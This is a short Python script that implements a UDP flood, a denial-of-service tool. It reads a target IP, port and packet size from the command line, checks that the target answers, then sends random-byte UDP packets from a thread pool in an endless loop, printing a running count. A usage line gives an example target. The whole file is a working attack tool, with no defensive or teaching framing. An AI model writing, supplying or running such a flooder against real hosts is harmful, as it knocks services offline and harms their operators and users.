import socket
import sys
from concurrent.futures import ThreadPoolExecutor
from os import cpu_count
from random import randbytes

cores = cpu_count() * 2
count = 0

def usage():
    print(f"""Usage: python3 {__file__} ip port bytes""")
    print("Example: python3 udp.py 1.1.1.1 80 1024")

def check_valid(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as socks:
            socks.settimeout(5)
            socks.sendto(b'', (ip, port))
        return True
    except:
        return False

def flooder(host_ip, port, bytesX):
    global count
    sVar = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    try:
        z3Payload = randbytes(bytesX)
        send_byte = sVar.sendto(z3Payload, (host_ip, port))
        count += 1
        return f"SEND {count} UDP Flood with {send_byte} BYTES {host_ip}:{port}"
    except Exception as e:
        print(e)
        return f"UDP Flood Failed On {host_ip}:{port}"
    finally:
        sVar.close()

def main():
    global count
    if len(sys.argv) != 4:
        usage()
        sys.exit(-1)

    website_host_or_IP = sys.argv[1]
    portX = int(sys.argv[2])
    bytesX = int(sys.argv[3])

    validity = check_valid(website_host_or_IP, portX)
    if not validity:
        sys.exit("This ip:port refused the connection")

    pool = ThreadPoolExecutor(max_workers=int(cores))
    while True:
        f = pool.submit(flooder, host_ip=website_host_or_IP, port=portX, bytesX=bytesX)
        print(f.result())

if __name__ == "__main__":
    main()
